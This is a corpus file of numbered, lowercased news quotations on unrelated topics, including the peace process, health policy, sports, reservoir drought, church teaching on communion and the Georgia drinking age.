8604517 but it also depends on how the fugitives will use ramadan to shield their actions i mean what they have done are un islamic how do you expect them to conform to islamic norms when they have slaughtered people
8604518 if the evidence shows it then the evidence will point out too that they have not been sincere in the peace process all along
8604519 i mean the question of proving sincerity and good faith now lies squarely on the shoulders of the milf i mean coddling criminals is not a sign of bona fide sincerity in anyones book

8604530 reducing health inequities is an ethical imperative social injustice is killing people on a grand scale
8604531 there is no good biological reason why this should be the case
8604532 these health inequalities are preventable they arise from the circumstances in which people are born grow live work and age the social determinants of health
8604533 taking action to deal with preventable causes of illness means taking social action a toxic combination of poor social policies unfair economic arrangements and bad politics is responsible
8604534 the commission considers health care a common good not a market commodity
8604535 the commission advocates financing the health care system through general taxation and or mandatory universal insurance the evidence is compellingly in favor of a publicly funded health care system
8604536 we are distressed by the reports we see of healthcare simply being unavailable to people because of inability to pay and we see that throughout lower and middle income countries
8604537 not for me to tell one of the richest countries on earth how it should organize its health care system
8604538 its not perhaps the best use of money thats being spent there are a lot of people who feel that and would actually like to see coming out of the current presidential campaign in the us proposals for a universal health insurance

8604540 we want the government to set aside money from the national budget for the benefit of programmes meant to uplift women that is a very feasible task
8604541 the same way that the national budget puts aside money for say building a bridge it should do the same with for instance financing income generating projects run by women
8604542 our task therefore is to identify both the projects that have actual importance and those with potential thereafter budgeting should start with the projects with the most urgency
8604543 planned policies and programmes must be analysed to determine any differential impact on women and men and adjusted accordingly before decisions are taken so as to ensure that they support the achievement of the gender equality goal

8604629 not only does this serve to teach a younger generation about plowing and farming but it brings back a lot of memories for the older generation
8604630 we always have more calls and e mails from kids and parents interested in swimming after an olympics
8604631 but theres been a lot more than usual in the past couple of weeks probably because of phelps its the same with the other coaches ive talked to
8604632 its great to see more kids and families getting into the sport how many of them will stay with it is the big question
8604633 the question we always ask beginning swimmers and families is are they ready to make the time commitment
8604634 it doesnt matter if youre with a united states swimming affiliated club like us the dolphins or at one of the area y teams
8604635 you have to be ready to put in the time
8604636 august is usually the only down period we have during the year
8604637 our big meets are done for the season we begin to gear back up in september so its almost a year round activity
8604638 the goal of the raiders or other swim clubs is specifically to develop swimmers to the highest level of national and international competition
8604639 so the training is going to be very intense and the competition at meets very deep
8604640 ive worked for some ys and the emphasis is on overall family fun and fitness there are plenty of very competitive y programs right around here like beavercreek south dayton or countryside in lebanon you get to the nationals and there are y teams which are tougher than a lot of club teams
8604641 our festival has always been a big success bringing folks in from kentucky ohio and indiana
8604642 we had over 10 000 here saturday and another 6 000 on sunday plus the good weather and again more than 300 volunteers
8604643 i tell ya wed be lost without those volunteers and all the work they do and another key to the success is event chairman tom ritchie with us since 1990 he gets out and raises money does all the booking for entertainment and keeps our financial books in order
8604644 we are still drawing good crowds but back in the early days we sometimes drew crowds of 20 000 and 25 000
8604645 it was the first time that someone within our mountain days family won the 1 000 award to sinclair community college

8604647 this is my fifth year helping out and i love it
8604648 we asked phyllis and del if they would be that first couple to be that test case to be that human face so that we could file a suit and ultimately get to the california supreme court and right some wrongs in our state
8604649 to do what theyve done to advance human rights is second to none
8604650 demanded equal rights and justice and she got it just a few weeks before she passed away
8604651 you cant separate an institution by making it a lower institution
8604652 how dare they have the audacity to say that today
8604653 really whats at stake is martins legacy and her life
8604654 i think its understandable frankly in this context and this political environment that a lot of folks are still not there yet
8604655 i understand the politics of this arguably better than any human being alive as a consequence of being defined as a politician by this issue

8604754 un crescendo di equivoci amplificati dai sentimentalismi di una fascinosa spia innamorata del musicista non facile addentrarsi nei particolari di questa commedia degli equivoci la cui trama ricorda molto le disavventure di pierre richard ricordate il grande biondo non a caso fra i soggettisti figura yves robert che lo diresse pi volte garbato e fresco senza altre pretese che quella di divertire in modo intelligente il film savvale di una disinvolta schiera di interpreti tom hanks lori singer charles durning dabn y coleman e di una regia non eccelsa ma di mestiere stan dragoti
8604755 dalla presenza nella storiella dello svagato musicista dalle innocenti sue distrazioni il film deriva qualche piacevolezza sviluppando una commedia degli equivoci abbinata verso la fine al dinamismo duna pellicola dazione dove trova anche posto il pentimento con la bella spia innamorata del violinista meno stralunato di come tra pierre richard nel remoto originale tom hanks colora con garbo e misura il protagonista affiancato da una lori singer carina assai efficaci come duso i caratteristi con una particolare citazione per il pi grasso charles durning

8604817 it will be conducive to the economic development of iraq and will meet chinas demands in the oil field as well and is also conducted according to market rules and will not harm any interests of any third parties
8604818 with oil prices surging the global contest for oil resources is becoming ever fiercer many governments have realised this and have become unwilling to sell their oil resources cheaply to the multinationals
8604819 since it has become more and more difficult to obtain equity and exploit rights in oil fields its good for china to participate in the development through a service contract it diversifies our oil sources and helps guarantee chinas oil supplies

8604831 we also warn the centre and the state government not facilitate the stay or entry of bangladeshis in the state the illegal migrants will have to leave the state and we will continue to intensify the agitation until the same is ensured
8604832 the future course of action would be chalked out after the end of the first phase of our agitation
8604833 around one lakh illegal migrants are staying in the district which is a dangerous sign the issue of illegal infiltration is not the problem of any student body or any particular district it is the problem of the entire state

8605053 im still hoping to add one striker and a goalkeeper by midnight on monday but we will have to wait and see

8605057 its a great opportunity for me to get back playing football at a high standard with a club who have ambitions to move forward
8605058 its a chance for me to get fit match fit that is and to play regular football
8605059 im very tired will speak with the chairman tomorrow thursday and will answer the press on friday
8605060 unfortunately for derek it looks like he will be at celtic beyond the transfer window as the club are not receptive to loan deals and thats all thats been offered at the moment
8605061 he was unsatisfied with his performance and i think this is normal
8605062 he must accept you have opponents on the field and not every day is your best day but you cannot lose your face we will talk today you have some rules and we cant accept this
8605063 this is an area we must look at we have a lot of options open and a lot of possibilities at the moment
8605064 i just want my fans to know i was at my worst and forrest was at his best and i still beat him
8605065 i wasnt really sure right at the end of the fight i know he hurt me and punched me in the face a couple of times but i was bobbing and weaving and making him miss stuff like that
8605066 i was hoping that he would come out later after he saw the fight and say yeah i saw the fight and i lost that fight
8605067 we started using virtualization to address power and space issues in our main datacenter we quickly adopted vmware esx as our standard platform for new projects and consolidated existing servers
8605068 it allowed us to continue business as usual and we experienced no delay in completing projects on time today we are way below our power threshold and gained about 50 of our floor space even after we doubled the amount of windows servers
8605069 before going virtual our datacenter power supply was maxed out we couldnt plug in a toaster now with less hardware we have capacity to handle whatever comes our way
8605070 this allowed us to condense many servers is a small amount of space with vmware and ibm bladecenters we were able to consolidate over a 150 servers into one rack
8605071 today we use hp dl580 g5 to handle larger server workloads

8605116 completed the negotiations and forged a comprehensive single undertaking free trade agreement
8605117 the ministers see the agreement as paving the way to enhancing the regions economic integration and to deepen and broaden the trade and investment among the twelve participating countries
8605118 this is the most comprehensive free trade agreement that asean has ever entered it is the largest free trade agreement that australia has ever negotiated
8605119 the ministers see the agreement as paving the way to enhancing the regions economic integration and acting as an impetus to deepen and broaden the trade and investment among the 12 participating countries
8605120 we are in very good shape in terms of the progress of the overall asean plus one process
8605121 we hope that this will lead toward a really greater east asia economic integration

8605124 stock markets go up a third of the time down a third of the time and sideways a third of the time
8605125 note that bear market cycles begin on reduced volume as the major downward phase develops volume increases and this phase ends in a selling climax on heavy volume the ensuing rally is accompanied by declining volume which dwindles until the rally loses momentum completely and the major trend is resumed in a new bear cycle bear market rallies start out of active climaxes
8605126 bear markets seem to be divided into three phases the first being the abandonment of hopes upon which the uprush of the preceding bull market was predicated the second being the reflection of the decreased earning power and reduction of dividends and the third representing distress liquidation of securities which must be sold to meet living expenses each of these phases seems to be divided by a secondary reaction which is often erroneously assumed to be the beginning of a bull market

8605130 we are in a situation which marks a clear end to the relative and growing calm in and around europe since the collapse of the soviet union
8605131 new nations have come out of the old soviet union theyve joined the european union and the european countries have enjoyed a period of unprecedented stability
8605132 i think the danger that arises from russian actions is that that period comes to an end

8605149 many meanings positive and negative are attached to the term masculinity
8605150 to ask a large sample of men what comprises their own sense of masculinity is very useful for both the media and for research these results suggest we should pay attention and ask rather than presume we know

8605155 more worrisome conditions include worsening heat illness hypoglycemia low sodium and heart related issues these can have major health implications including death
8605156 at this point we need to prevent people from going further into the spectrum of heat illness stretch drink water or sports drinks if a person is wearing any type of equipment take it off
8605157 after you call 911 immediately immerse the person in a tub of cold water and ice

8605182 why am i the first kinnock in a thousand generations to be able to get to university why is my wife glenys the first woman in her family in a thousand generations to be able to get to university was it because all our predecessors were thick
8605183 i started thinking as i was coming over here why is it that joe biden is the first in his family ever to go to a university why is it that my wife who is sitting out there in the audience is the first in her family to ever go to college is it because our fathers and mothers were not bright
8605184 those people who could sing and play and recite and write poetry those people who could make wonderful beautiful things with their hands those people who could dream dreams see visions why didnt they get it was it because they were weak those people who could work eight hours underground and then come up and play football weak
8605185 those same people who read poetry and wrote poetry and taught me how to sing verse is it because they didnt work hard my ancestors who worked in the coal mines of northeast pennsylvania and would come up after 12 hours and play football for four hours
8605186 so what if i didnt attribute it to kinnock i cant quite understand this if i was making up who i was then thats one thing
8605187 because there was no platform upon which they could stand

8605197 it is sometimes difficult to make any contribution anywhere without it being considered original research
8605198 lack of discussion could mean that people are fine with how things are now besides you
8605199 in this situation your going to need contributors to that book to participate in the discussions voice opinions on what should be changed in written form on wiki and come to some sort of consensus before anything changes regardless of any individuals interpretation
8605200 again requirement that a actual discussion takes place is only on your head you only must provide an idea for other to express objection and grant them a chance to do it
8605201 it is sometimes difficult to make any contribution anywhere without it being considered original research
8605202 high performance computing is entering a new era of massively parallel processors and petascale systems that will enable researchers to solve a new class of complex problems
8605203 but to fully leverage these resources researchers will need in depth knowledge about parallel programming principles as well as the parallelism models communication models and resource limitations of these processors
8605204 a huge challenge in teaching computational science is that computer science departments typically focus on topics that computer scientists need to know while in domain science and engineering departments like physics chemical engineering or aerospace engineering computational science courses focus on applications of simulation to those disciplines
8605205 many aspects of the nuts and bolts of computational science then fall between the cracks and as a result it is not easy for todays students to learn all they need to know to become tomorrows innovators in high performance scientific computing
8605206 although i still have a ways to go on learning the specifics of fully utilizing accelerator technology i feel that i have been given a firm foundation in the way the architecture works
8605207 i will be much more mindful of the types of engineering problems which can exploit the capabilities of gpgpus now especially considering their cost effectiveness compared to cpu clusters
8605208 this summer school has given me a starting point for cuda programming for the nvidia gpus that i plan to explore in depth
8605209 writing multi threaded code for my research in nanoparticle self assembly will help us look at bigger systems and longer time scales that are currently inaccessible maybe it will help us get results faster or maybe it will help us look at things we couldnt even think about looking at before
8605210 the contacts i made will help me keep in touch with a circle of researchers from different areas that are interested in gpu programming
8605211 the contacts and friendships that were gained over the past week will hopefully be used to keep on top of cutting edge gpu research and maybe even for a future collaboration
8605212 the project i started during the summer school with tom henretty ohio state university will hopefully provide the basis for porting coupled cluster methods in nwchem and other quantum chemistry codes to gpu enabled hardware
8605213 i plan to used what i learned at the summer school to consult on the application of gpu programming in the research projects of my fellow igert students though our regular seminars
8605214 with the trends of high performance computing moving toward heterogeneous systems learning the basics and practical applications of gpu programming is a necessity for a young researcher in computational fluid dynamics and in fact all computational sciences

8605251 whoever did this clearly didnt care if anyone was hurt or killed and needs to be caught the damage was quite breathtaking
8605252 it blew the porch to pieces and damaged several windows i cannot speculate on a motive for this but we are clearly dealing with people who have no regard for human life
8605253 i have never known the identity of the firefighter who saved me and to come face to face with him after all these years was an amazing coincidence
8605254 i always wondered what happened to emma and her family
8605255 i was shocked but it was a good feeling to actually speak to her
8605256 its very unusual to meet the people we help so long after the event
8605257 the fire started in the kitchen and was well alight when we got there it started burning through into the bedroom above and the house was full of smoke
8605258 firefighters always work as a team but i was the one who went into the bedroom and carried emma out they wouldnt have lasted long in there
8605259 i dont remember much about the fire but he was telling me how quickly the fire spread and how frightened i was
8605260 you are going to get zealots the very people for whom zanjeer zani has always been a hotbed using the practice to make a political point we are concerned that they may say this is mans law and gods law is higher but this is not gods law and like the concept of jihad is misunderstood by some it is not a religious edict but a state of mind
8605261 the authorities should have been educating the community we fear a small percentage will make children do the zanjeer zani in defiance i believe islamaphobia has coloured this case and this will make the shia community think about where they stand in the community
8605262 we dont condone anyone under the age of 16 doing it but we do believe that after the age of 12 a boy can start making his own decisions and if a teenager is built like a brick outhouse and wants to do it you cant stop them doing it
8605263 some of the people do it so hard the skin flays off their breast but the police have never stopped them children who do the zanjeer zani have been doing the matam since they were little babies if mr zaidi goes to jail we may see copycats who want to go to jail to highlight the issue
8605264 this sort of practice has been going on throughout the islamic world for centuries and although there have been cases like this in the past they havent been brought to court
8605265 because of this case this practice has now been highlighted and this law is now being brought to the attention of the community before our community didnt know about the law
8605266 the community and community leaders are now working together with the cps and the police to bring about a code of practice to benefit everyone
8605267 we cannot eliminate this practice but we can and will work to a code of practice so that the children dont get hurt the law isnt broken and the people who do want to take part dont get prosecuted
8605268 we have to take into account peoples beliefs and their rights and we will respect them but we are not above the law and we never will be and working with the authorities is the best chance weve got to prevent any harm being brought against any children
8605269 the best way of achieving our aims now is to try and understand the law better and work within the law to move forward
8605270 this case doesnt set a precedent this case was decided on its own facts but what the case does show is that any practice which exposes children to harm will be subject of a crown prosecution service decision
8605271 the cps and prosecuting counsel andrew nuttall have always been at pains so say that this isnt an attack on shia practices the crux of the issue is the victims age and the prosecution was brought on the basis that an adult cant cause a child to be harmed or expose a child to harm under british law

8605324 taking the decision to close any post office branch is always very difficult
8605325 regrettably we have been informed by the festival organisers that due to the withdrawal of financial backing for the event it cannot go ahead as planned
8605326 they assure us that all tickets will be fully refunded and ask people to contact directly the booking agents through whom they bought tickets
8605327 we thoroughly share the disappointment of all who planned to attend the event but fully respect the 1life organisers decision and appreciate the unfortunate circumstances that have led to the cancellation
8605328 we are looking forward to the 1life events being a success in 2009

8605335 next time it could be a child there are children who play there
8605336 it came out of nowhere he was growling and looked like he was ready to go for me but then it dived for shane
8605337 there was no way i could get it loose it was just like a horror movie
8605338 it was snarling and everything if i had been able to pick up shane i think it would have gone for my legs there was nothing i could do
8605339 in other words allowing everyone not just web developers to remix the web so it fits their needs no matter what page they are on or what they are doing
8605340 most people do not have an easy way to manage the vast resources of the web to simplify their task at hand for the most part they are left trundling between websites performing common tasks resulting in frustration and wasted time ubiquitys interface goal is to enable the user to instruct the browser by typing speaking using language what they want to do
8605341 the goal of the video games defense is to both shift blame and to explain to a judge and jury why this good kid is suddenly acting like a terrorist
8605342 portraying your client as the victim of outside forces be they child abuse coercion by peers or an ultra violent video game industry humanizes the client and shifts the culpability
8605343 the whole process has been a sham ive now applied three times and not to have it by now is ridiculous
8605344 i filled in an application form and sent it off with a copy of my birth certificate and a bill i knew the pass would be very popular and i expected it would take a bit of time so i waited patiently
8605345 but then in march i got fed up so i called greater manchester passenger transport authority they said the information had been lost but not to worry because they were sure it had been destroyed
8605346 since then ive gone back and forth and filled in two more forms but have had nothing back
8605347 i said youve got to be joking so they said if i came into manchester they would do it there and then
8605348 but im not doing that how much would it cost me to park there im a pensioner
8605349 they reckon the personal information has been destroyed but how do they know that if it was lost
8605350 they havent a clue crooks could have my details and be filling out applications for passports and all sorts the whole thing has been an utter joke
8605351 i am sorry his attempts to apply for a travel pass have been unsuccessful
8605352 we have made arrangements to provide him with his pass as soon as possible and will look to establish why his previous attempts have been unsuccessful we have now issued more than 400 000 new smart card style national travel passes and are still receiving 2 000 applications every week
8605353 we have a dedicated team taking care of this but there is no backlog
8605354 a straightforward application should be processed in about three weeks as long as the form is filled in correctly and we have the documents we need
8605355 if people have applied for a pass more than two months ago and not yet received it and havent heard from us they should contact us as soon as possible on 0161 244 1050

8605376 abolish the stage and the auditorium and replace them by a single site without partition or barrier of any kind which will become the theater of the action
8605377 the magical means of art and speech to be exercised organically and altogether like renewed exorcism
8605378 to create a meta physics of speech gesture and expression in order to rescue it from its servitude to psychology and human interest
8605379 it is of little importance whether these other levels are really conquered by the mind or not i e by the intelligence it would diminish them and that has neither interest nor sense what is important is that by positive means the sensitivity is put in a state of deepened and keener perception and this is the very object of the magic and the rites of which the theater is only a reflection
8605380 this language cannot be defined except by its possibilities for dynamic expression in space for dissociative and vibratory action upon the sensibility
8605381 extends the voice and liberates a new lyricism of gesture which by its precipitation or its amplitude in the air ends by surpassing the lyricism of words
8605382 neither humor nor poetry nor imagination means anything unless by an anarchistic destruction generating a prodigious flight of forms which will constitute the whole spectacle they succeed in organically re involving us our ideas about reality and our poetic place in reality

8605428 after the allegation done by mainly aatasu the district administration of the sivsagar put a magisterial commission on it which proves that the company didnt do any survey in the restricted area but did some 4 km away from it which was ignorant to us and now ongc has decided to stop its oil well drilling work in the zone ongc has always been concern over the assam sentiment and its local issues and it will continue to respect the historic importance of the land and will do all to protect it
8605429 though we have decided to stop the digging work there but it will surely going to hamper the oil production to 554 metric ton oil per day and it will not only be the loss of the corporation but also for the state government but still the corporation is committed for the regions sentiments and will bear it for a good cause
8605430 we are simply pleased with their decision to respect our feelings and as a responsible organization we had already expect it from them and we wish them all the good wishes to have a proper operation in the state for its development

8605433 the challenge is to set an example to the new comers today the lack of attention towards water sports is should be taken seriously by the sports authority now a days swimming is only taken as a re creation where as the world sports has concentrated a larger scale of the importance unto the water sports in india swimming is never taken seriously by any authority and thats why we lack good competitor in the olympics and other international events hereby i am trying to set that swimming can be fun and can be the sports of the country to set a new identity in sports world
8605434 water sports are seen as respectable like other sports in rest part of the world but not in our country its merely a recreation we all hope that elviss swimming will be of great inspiration to the new comers to do good in swimming and others
8605435 i am encouraged to see how a sportsman can change the outlook of all i and my friends who are already in the coaching for swimming has decided to take it more seriously and to convey the message to others as well

8605465 government agencies have had a strong presence in this part of the city centre since the 1960s so its great news that not only have they chosen to stay here but are enhancing their presence with the relocation of the tda from london
8605466 this expansion will inevitably bring new employment opportunities for local people and help sustain manchesters economy

8605468 why is the pct taking this step who made this decision and more importantly what is the cost a recent rebranding of norfolk pct to norfolk nhs cost 15 000 for signs and stationery
8605469 the pct should be putting the care of patients first instead of their public image this seems to be a trendy vanity led project that wont help the people of this borough one iota

8605486 it is important for soaps to portray a healthier lifestyle for their characters
8605487 tens of millions of brits regularly watch soaps every week and are influenced by what they see especially younger viewers who look up to the soap characters as role models
8605488 it is disappointing to see soap characters lack of exercise
8605489 soap families should be encouraged to reduce their regular trips to jerrys takeaway and to swap their deep fried meals pints of lager and greasy fry ups for a healthier diet and regular exercise
8605490 coronation street is a drama which is there to entertain and reflect life in the back streets of northern britain
8605491 the pub has always been a focal point for the show as it brings characters together and allows us to play out some great drama
8605492 however viewers can currently see a storyline where jerry has suffered a massive heart attack as a result of his unhealthy lifestyle and has had to focus on changing his eating habits and taking up regular exercise
8605493 i heard about it on one of the local news stations on my commute in that they were offering the chance to drive these
8605494 youre not sacrificing anything and actually for me its an enhanced driving experience
8605495 i think thats a misconception people have that youre puttering around in an underpowered cramped little soapbox
8605496 its allowed people to live with these vehicles in a way that they dont have to feel restricted in the distances they can travel or where they can go
8605497 as i was putting him in the car i was wondering is it the engine noise that quiets the baby or the road noise we had no idea
8605498 we found out its probably the road noise and the motion
8605499 it didnt have much to do with the engine noise since theres no internal combustion engine
8605500 will one white lie send someone to hell for all eternity
8605501 i definitely saw that with my siblings i saw that with my friends
8605502 and i was probably close to going that path but i always liked school but it was hard you know trying to finish every year with good grades
8605503 the biggest barrier to college education for first generation students is sort of feeling of being a fraud
8605504 a lot of people also have generalized things like oh you mexicans are really hard workers
8605505 sure but i like to think of myself as no im a lazy bum or i like to sit and read and when that actually takes you further than working so hard i feel like im capable just like anyone else to be able to become a ceo or start my own organization
8605506 the biggest barrier to college education for first generation students is sort of feeling of being a fraud
8605507 a lot of times first generation college students feel like ive made it this far im kind of fooling people theyre going to find me out any day now that i dont really belong here and they get those messages of not belonging in so many different subtle ways
8605508 what a lot of the programs provide is exactly what the students are missing which is college knowledge
8605509 the real understanding of not only the technical aspects of getting to college how to apply the financial aide aspects how to choose a career those more technical pieces but also the social aspects being motivated having people telling them they can do it they can get there
8605510 i remember my mom telling me its your decision really its something we dont know much about we cant help you and we dont have the money to help you either to do any of this

8605513 however no commercial terms have been agreed there is no certainty that any transaction will result
8605514 we wanted to make instruction available to students 24 7 and to provide student access to advice and productivity tools anytime and anywhere that made sense to them
8605515 with this consolidation we have addressed the need to have all of our servers centralized where they can be stored backed up and protected all in one location the dell solution provided everything from set up to the removal of our old pcs and boxes
8605516 we started using virtualization to address power and space issues in our main datacenter we quickly adopted vmware esx as our standard platform for new projects and consolidated existing servers
8605517 it allowed us to continue business as usual and we experienced no delay in completing projects on time today we are way below our power threshold and gained about 50 of our floor space even after we doubled the amount of windows servers
8605518 before going virtual our datacenter power supply was maxed out we couldnt plug in a toaster now with less hardware we have capacity to handle whatever comes our way
8605519 this allowed us to condense many servers is a small amount of space with vmware and ibm bladecenters we were able to consolidate over a 150 servers into one rack
8605520 today we use hp dl580 g5 to handle larger server workloads

8605552 im proud to say that my party the democratic party is united behind and supports a womans right to choose a safe and legal abortion
8605553 to see millions of innocent human lives extinguished and then to celebrate that is very disappointing

8605557 these figures show just how reliant the labour party is on the unions to stave off bankruptcy with the labour party divided and gordon brown vying for the title of britains weakest ever prime minister it is clear that ordinary donors are deserting brown and labours union paymasters are calling the shots
8605558 these donations show a healthy income for the labour party and coupled with our wider strategy to make the party live within its means they are a sign of our improving financial position
8605559 we are taking further action to meet the continuing challenges facing the party and making progress towards putting its finances on a stable footing for the long term
8605560 having previously called on parties to address the issue of late reporting of individual donations we are pleased to see this being addressed and expect to see continued improvements
8605561 we are pleased that the political parties amp election bill includes the more flexible and proportionate range of penalties that the commission has been calling for
8605562 parties who failed to provide a donation or a borrowing return on time will automatically incur a penalty

8605584 being biased against mobile network operators and exercising apparent favouritism towards telecom

8605590 pious activities can be executed only when inspired by your mercy therefore without taking shelter at your lotus feet one cannot surpass the influence of material energy actually we as personified vedic knowledge are always engaged in your service to help the conditioned soul to understand you
8605591 of all his glories the most important is his causeless mercy upon the conditioned souls in reclaiming them from the clutches of maya
8605592 without being empowered by the direct potency of lord krishna to fulfill his desire and without being specifically favored by the lord no human being can become the spiritual master of the whole world only an empowered personality can distribute the holy name of the lord and enjoin all fallen souls to worship krishna by distributing the holy name of the lord he cleanses the hearts of the most fallen people therefore he extinguishes the blazing fire of the material world not only that he broadcasts the shining brightness of krishnas effulgence throughout the world such an acarya or spiritual master should be considered nondifferent from krishna that is he should be considered the incarnation of lord krishnas potency such a personality is krishnalingita vigraha that is he is always embraced by the supreme personality of godhead krishna such a person is above the considerations of the varnasrama institution he is the guru or spiritual master for the entire world a devotee on the topmost platform the maha bhagavata stage and a paramahamsa thakura a spiritual form only fit to be addressed as paramahamsa or thakura
8605593 what will be the result of accepting the shelter of the lotus feet of lord nityananda
8605594 narottama dasa thakura then says nitaiyer koruna habe braje radha krsna pabe if you actually want to approach the association of radha krsna you must achieve the mercy of lord nityananda first
8605595 lord caitanyas distribution of this love of god is compared with an ocean rasa arnava
8605596 let me dive deep into the ocean of the transcendental loving movement introduced by lord caitanya he immediately becomes one of the confidential devotees of radha and krsna
8605597 the ocean of lord nityanandas glories is infinite and unfathomable only by his mercy can i touch even a drop of it please listen to another glory of his mercy he made a fallen living entity climb to the highest limit to disclose it is not proper for it should be kept as confidential as the vedas yet i shall speak of it to make his mercy known to all o lord nityananda i write of your mercy out of great exultation please forgive me for my offenses
8605598 all glory all glory to lord nityananda balarama by whose mercy i have attained shelter in the transcendental abode of vrnd vana
8605599 wearing yellow garments and decorated with a flower garland lord krishna appearing among the gopis with his smiling lotus face looked directly like the charmer of the heart of cupid
8605600 my dear brother i request that you just worship lord caitanya and nityananda with firm conviction and faith
8605601 when am i going to make money instead of spending it
8605602 if nothing changes within the next 12 months we predict that we will hit level iv the most severe drought classification late next summer
8605603 this means that we can no longer pass water through the turbines without causing damage instead we have to run the water through the sluice gates
8605604 since october we have been releasing only the bare minimum of water a daily average of 3 600 cubit feet per second through thurmond dam as determined by the states of georgia and south carolina the states agreed on the need to retain as much water as possible in the three reservoirs
8605605 if nothing changes we are expecting each of the reservoirs to hit record low levels before the end of the year maybe sooner
8605606 after a dry autumn last year we were at our lowest on christmas day
8605607 however the levels began to rise in january because the winter months tend to be rainy
8605608 this is all being driven by a long and persistent drought in the upper savannah river basin
8605609 until the drought breaks water levels will continue to decrease we are managing the reservoirs using the best professionals we have
8605610 the fact is the states of georgia and south carolina require us to maintain the savannah river past thurmond dam and to do this we have to pass water through the dam there are cities counties and utility plants downstream that need the water
8605611 but we want to use the water for as many purposes as we can
8605612 if we pass it downstream we might as well run it through the turbines if not it would be wasted energy and in this day and age we dont want to waste energy nevertheless the bottom line is we generate electricity because we have to pass water downstream
8605613 passing water downstream is our primary objective so that the water supply and water quality can be maintained below thurmond dam
8605614 there is a minimum amount of water that needs to be in each reservoir to run water through the turbines and it varies from reservoir to reservoir
8605615 in the event of an emergency we can use the shoreline pump
8605616 still i believe well get rain before that happens but my guess is as good as anybody elses
8605617 we just need to play one game at a time avoid injuries and get better from week to week on the offensive side of the ball
8605618 on the whole i was pleased with the scrimmage game
8605619 nevertheless after watching the film i realized there are a lot of areas we need to improve on we cant let our heads swell because we won the scrimmage
8605620 we have only one returning lineman garrett matthews and zero experience at quarterback
8605621 we are running a new offense this year spread formation which requires a lot of flexibility on the part of the quarterback we played three thursday night bo reed franklin sherman and garrett mohr they did good things and they made mistakes
8605622 i hope our offense will get better as the season progresses
8605623 i have no clue how theyre going to do with that many gaps were going to have to establish consistency both in passing and running
8605624 he was held out of contact practice this week but he will be able to play friday night
8605625 we put extra pressure on the defense because we count on it to keep us in the football game early in the season we have three returning linemen two returning linebackers and three returning in the secondary
8605626 our defense played extremely well for the first game of the season
8605627 our kicking game is in great hands with senior vance tarver
8605628 he is an experienced kicker and punter and played well in the game against thomson
8605629 leadership is extremely important it wasnt super last year i hope it is an area where we will show improvement
8605630 we only had four days of two aday practices also we didnt have camp because school started so early still it hasnt been hot like it usually is overall things have been going well except for the injuries
8605631 this is probably one of the toughest schedules weve had since i started as head coach from top to bottom
8605632 they will be a tough opponent theyre picked to win their region
8605633 during the show we were able to put clarks hill lake and the hotels attractions restaurants and services in each of our counties in front of an estimated 45 000 outdoor enthusiasts
8605634 everything went very well we were swamped with visitors to our booth easily dealing with 100 plus people an hour it was very busy but we had a wonderful time we had about 25 boxes of georgia travel guides and gave away all 600 of them
8605635 there was a lot of interest shown particularly in the lake and our state park
8605636 but i had a goal with the team before the season started and im sticking to it
8605637 to be as simple as possible i just want to play football thats what it comes down to i know whats on the table i know whats on the line i put a lot of work in this and i want to play

8605647 receiving the body and blood of christ unworthily is a sacrilege
8605648 if it is done deliberately in mortal sin it is a sacrilege
8605649 public officials who with knowledge and consent uphold actions that are against the divine and eternal moral law for example if they support abortion which entails the taking of innocent and defenseless human lives a person who commits sin in this way should be publicly admonished in such a way as to not receive communion until he or she has reformed his life
8605650 if a person who has been admonished persists in public mortal sin and attempts to receive communion the minister of the eucharist has the obligation to deny it to him why above all for the salvation of that person preventing him from committing a sacrilege
8605651 we must avoid giving people the impression that one can be in a state of mortal sin and receive the eucharist
8605652 secondly there could be another form of scandal consisting of leading people to think that the public act that this person is doing which until now everyone believed was a serious sin is really not that serious if the church allows him or her to receive communion
8605653 if we have a public figure who is openly and deliberately upholding abortion rights and receiving the eucharist what will the average person think he or she could come to believe that it up to a certain point it is okay to do away with an innocent life in the mothers womb
8605654 it is not with the intention of interfering in public life but rather in the spiritual state of the politician or public official who if catholic should follow the divine law in the public sphere as well
8605655 therefore it is simply ridiculous and wrong to try to silence a pastor accusing him of interfering in politics so that he cannot do good to the soul of a member of his flock

8605693 there was a series of provocations so the russians could do probably what they wanted to do
8605694 we fully support georgias independence and territorial integrity which cannot be changed by decree from moscow
8605695 the only thing i love more than double entendres is really good pizza and really artistic macncheese
8605696 i think ill sell my tickets and watch south carolina on tv saturday
8605697 thats a big game for you and the old ball coach
8605698 yeah i know but its too much of a hassle to drive down to the stadium
8605699 i think ill just stay home and watch it on tv
8605700 well be taking x rays of your chest and back well probably take your blood heres a cup go ahead and do this for me
8605701 um i didnt know what was going on so i dont exactly need to go right now
8605702 okay no problem just before you leave or whenever your ready go ahead and take your shirt off and were going to run an ekg on you
8605703 im in control that was unnecessary a bit embarrassing and more importantly a total lack of constitution im done with that
8605704 liver good kidneys good bp good overall cholesterol good bad cholesterol levels are good
8605705 clean bill of health youre just out of shape friend and fat
8605706 were more open about approaching and bringing services in to ps3 and psp
8605707 we cant support all the needs of the consumer and there are great companies providing services on the pc already so were very open to provide the opportunity to those companies to reach our user base as well
8605708 there are things were looking at and learning how we can provide a service without people having to pay
8605709 but we still get our operation running with funding from somewhere so that we can maintain the level of quality we want
8605710 we like to provide as many services as possible for free we already provide our network access for gameplay for free and the interesting thing about the network side and the internet business is that theres a variety of revenue sources
8605711 these events are exciting for the staff since we get a chance to see the kids having so much fun and get to witness the prospective adoptive families reactions when they recognize how great these kids are
8605712 but the real excitement for everyone begins after these events when you learn about matches that were made as a result
8605713 drivers need to re acclimate themselves to having children on and near the road particularly at rush hours and both children and their parents need to get back into their good traffic safety habits
8605714 it is such an overall part of the health of the patient
8605715 so changing the drinking age now would be like losing a whole classroom of our college students for an entire graduating class in georgia each year
8605716 the 21 law is working every day to save lives in georgia
8605717 lowering the legal drinking age would have the undeniable effect of making alcohol more accessible to youth if georgia lowers the drinking age more of our young people will drink and drive and more of our young people will die
8605718 we are dismayed that some college and university presidents have signed onto an initiative aimed at repealing this life saving law
8605719 both research and handson experience of state highway safety agencies indicates this law has saved countless lives underage drinking remains a serious problem that needs to be addressed but lowering the drinking age would be a gigantic step backward for highway safety
8605720 we want to thank the majority of georgia colleges and universities for making the right choice to maintain the drinking age where it is
8605721 we especially thank morehouse college for placing the wellbeing of its students in the forefront and instead withdrawing its support to the amethyst initiative now we encourage oglethorpe georgia southwestern state and spellman colleges to reconsider their support of this misguided stance
8605722 quite frankly these colleges and universities are looking for a quick fix
8605723 its akin to prescribing a smart pill for calculus rather than showing up to take the course
